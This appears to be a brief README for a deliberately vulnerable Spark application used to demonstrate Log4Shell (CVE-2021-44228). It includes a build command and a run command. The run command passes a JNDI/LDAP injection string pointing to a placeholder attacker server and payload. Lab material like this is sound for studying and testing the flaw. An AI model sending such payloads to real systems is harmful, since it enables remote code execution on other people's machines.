# Log4Shell sample vulnerable Spark application (CVE-2021-44228)

This is a vulnerable Spark application.

## How to build
`mvn clean package`

## How to execute
`spark-submit target/log4shell-vulnerable-spark-app-0.1.0-SNAPSHOT.jar ${jndi:ldap://<ldap-server-ip>:1389/<payload>`

Note that you might have to escape the curly braces in your shell.
